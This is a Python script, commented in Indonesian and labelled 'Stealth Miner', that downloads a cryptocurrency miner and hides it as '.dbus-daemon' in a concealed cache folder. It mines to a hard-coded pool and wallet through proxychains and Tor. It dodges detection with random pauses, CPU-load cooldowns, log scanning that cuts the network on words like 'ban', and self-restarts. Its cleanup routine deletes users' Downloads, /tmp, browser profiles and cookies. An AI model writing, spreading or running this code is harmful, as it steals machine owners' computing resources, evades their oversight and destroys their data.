#!/usr/bin/env python3
import os, subprocess, urllib.request, tarfile, time, threading, shutil, sys, random, socket

# ==== Konfigurasi ====
URL = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
TARFILE = "miner.tar.gz"
BIN_NAME = "cpuminer-sse2"
ALIAS_BIN = ".dbus-daemon"
HIDDEN_DIR = os.path.expanduser("~/.cache/.sysd")
POOL = "stratum+tcp://164.92.145.122:80"
WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Recut"
PASSWORD = "x"
THREADS = os.cpu_count()

# ==== Durasi ====
MIN_DURATION = 300
MAX_DURATION = 720
MIN_PAUSE = 120
MAX_PAUSE = 240
COOLDOWN_DURATION = 180
cooldown_restart_counter = 0
cooldown_restart_limit = 3
cooldown_reset_time = time.time() + 3600

# ==== Proxychains Setup ====
def ensure_proxychains():
    if shutil.which("proxychains4"): return "proxychains4"
    elif shutil.which("proxychains"): return "proxychains"
    local = os.path.expanduser("~/.local/bin/proxychains4")
    if os.path.exists(local):
        os.environ["PATH"] = os.path.dirname(local) + ":" + os.environ.get("PATH", "")
        os.environ["LD_LIBRARY_PATH"] = os.path.expanduser("~/.local/lib") + ":" + os.environ.get("LD_LIBRARY_PATH", "")
        return local
    return None

def setup_proxychains_conf():
    conf_dir = os.path.expanduser("~/.proxychains")
    conf_path = os.path.join(conf_dir, "proxychains.conf")
    if not os.path.exists(conf_path):
        os.makedirs(conf_dir, exist_ok=True)
        with open(conf_path, "w") as f:
            f.write("""strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 9050
""")

def run_with_proxy(cmd):
    proxy = ensure_proxychains()
    if proxy:
        setup_proxychains_conf()
        return [proxy] + cmd
    return cmd

# ==== Anti Suspend ====
def anti_suspend():
    while True:
        try: sys.stdout.write("\b"); sys.stdout.flush()
        except: pass
        time.sleep(15)

# ==== DoH & Bypass ====
def dns_doh_bypass():
    try:
        subprocess.call(["curl", "-s", "-H", "accept: application/dns-json",
            "https://cloudflare-dns.com/dns-query?name=pool.rplant.xyz&type=A"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except: pass

def firewall_bypass():
    try:
        socket.create_connection(("1.1.1.1", 443), timeout=2).close()
    except: pass
    subprocess.call(["ping", "-c", "1", "8.8.8.8"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# ==== Sistem Proteksi ====
def is_cpu_100_percent():
    try: return os.getloadavg()[0] >= os.cpu_count()
    except: return False

def should_restart():
    global cooldown_restart_counter, cooldown_reset_time
    if time.time() > cooldown_reset_time:
        cooldown_restart_counter = 0
        cooldown_reset_time = time.time() + 3600
    cooldown_restart_counter += 1
    return cooldown_restart_counter <= cooldown_restart_limit

def disconnect_network():
    try:
        subprocess.call(["nmcli", "networking", "off"])
        subprocess.call(["nmcli", "radio", "wifi", "off"])
    except: pass

def reconnect_network():
    try:
        subprocess.call(["nmcli", "networking", "on"])
        subprocess.call(["nmcli", "radio", "wifi", "on"])
    except: pass

def detect_threat_log():
    paths = ["/var/log/auth.log", "/var/log/syslog", "/etc/nologin"]
    for path in paths:
        if os.path.exists(path):
            try:
                with open(path, "r", errors="ignore") as f:
                    if any(x in f.read().lower() for x in ["suspend", "ban", "terminate", "dismiss"]):
                        disconnect_network()
                        restart_script()
            except: continue

# ==== Pembersihan ====
def clean_all():
    for f in [TARFILE, HIDDEN_DIR]:
        try:
            if os.path.isfile(f): os.remove(f)
            elif os.path.isdir(f): shutil.rmtree(f)
        except: pass
    for path in [
        "~/.cache", "~/.local/share", "~/Downloads", "/tmp",
        "~/.config/google-chrome/Default/Cookies",
        "~/.mozilla/firefox", "~/.config/chromium/Default/Cookies"
    ]:
        full = os.path.expanduser(path)
        try:
            if os.path.isfile(full): os.remove(full)
            elif os.path.isdir(full): shutil.rmtree(full)
        except: pass

# ==== Menjalankan Miner ====
def run_one_session():
    os.makedirs(HIDDEN_DIR, exist_ok=True)
    urllib.request.urlretrieve(URL, TARFILE)
    with tarfile.open(TARFILE) as tar: tar.extractall()
    hidden_path = os.path.join(HIDDEN_DIR, ALIAS_BIN)
    os.rename(BIN_NAME, hidden_path); os.chmod(hidden_path, 0o755)
    duration = random.randint(MIN_DURATION, MAX_DURATION)
    print(f"[⛏️] Menambang selama {duration}s...")
    proc = subprocess.Popen(run_with_proxy([hidden_path, "-a", "power2b", "-o", POOL,
        "-u", WALLET, "-p", PASSWORD, f"-t{THREADS}"]),
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(10)
    if os.path.exists(TARFILE): os.remove(TARFILE)
    start = time.time()
    while time.time() - start < duration:
        time.sleep(10)
        if is_cpu_100_percent():
            print("[⛔] CPU 100%, cooldown...")
            disconnect_network()
            proc.terminate()
            time.sleep(COOLDOWN_DURATION)
            if should_restart(): restart_script()
            else: return
    proc.terminate()

# ==== Restart ====
def restart_script():
    print("[🔁] Restart...")
    clean_all()
    time.sleep(5)
    subprocess.Popen([sys.executable] + sys.argv)
    sys.exit(0)

# ==== Main Loop ====
def main_loop():
    while True:
        clean_all()
        run_one_session()
        pause = random.randint(MIN_PAUSE, MAX_PAUSE)
        print(f"[⏸️] Istirahat {pause}s...\n")
        time.sleep(pause)

# ==== Entry Point ====
if __name__ == "__main__":
    print("🚀 Stealth Miner Aktif...")
    reconnect_network()
    threading.Thread(target=anti_suspend, daemon=True).start()
    threading.Thread(target=dns_doh_bypass, daemon=True).start()
    threading.Thread(target=firewall_bypass, daemon=True).start()
    threading.Thread(target=detect_threat_log, daemon=True).start()
    try: main_loop()
    except KeyboardInterrupt: restart_script()
    except Exception as e:
        print(f"[!] Error: {e}")
        restart_script()
